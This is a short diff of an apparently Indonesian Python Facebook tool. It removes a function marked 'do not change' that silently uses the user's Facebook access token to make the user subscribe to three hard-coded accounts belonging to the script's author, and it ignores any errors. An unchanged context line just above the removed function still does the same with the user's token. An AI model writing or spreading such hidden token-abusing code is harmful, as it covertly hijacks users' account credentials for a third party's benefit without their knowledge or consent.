@@ -261,20 +261,6 @@ def bot():
 	try:
 		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
 			
-
-# JANGAN DI UBAH !
-def login_bot(romz):
-	try:
-		toket = romz
-		romz1 = ('100067807565861')
-		romz2 = ('100029143111567')
-		romz3 = ('100028434880529')
-		requests.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI AFRIZAL PENGGUNA AKUN UNIK
-		requests.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
-		requests.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
-		
-	except:
-		pass
 		
 # MENU PILIHAN INI AJG
 class Menu():
